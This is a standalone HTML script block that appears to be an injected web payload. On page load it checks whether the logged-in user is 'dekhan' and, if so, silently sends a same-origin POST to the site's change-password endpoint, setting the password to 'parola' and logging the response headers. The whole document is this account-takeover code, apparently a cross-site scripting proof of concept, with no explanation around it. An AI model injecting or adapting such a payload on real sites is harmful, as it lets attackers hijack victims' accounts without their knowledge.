<script>
    $(function () {
        console.log(window.authUserName);
        if (window.authUserName === 'dekhan') {
            // Theoretically change password
            var newPassword = 'parola';
            $.ajax({
                url: '/inside/auth/change_password', // The URL for the password change API
                type: 'POST',
                data: {
                    password: newPassword,
                    confirm_password: newPassword
                },
                success: function (response, textStatus, xhr) {
                    // Log the status code and response body
                    console.log('Password changed successfully. Status:', xhr.status, 'Response:', response);

                    // Log all response headers
                    console.log('Response Headers:', xhr.getAllResponseHeaders());
                },
                error: function (xhr, status, error) {
                    // Log error details including status code and text
                    console.log('Failed to change password. Status:', xhr.status, 'Error:', error);
                }
            });
        }
    });
</script>
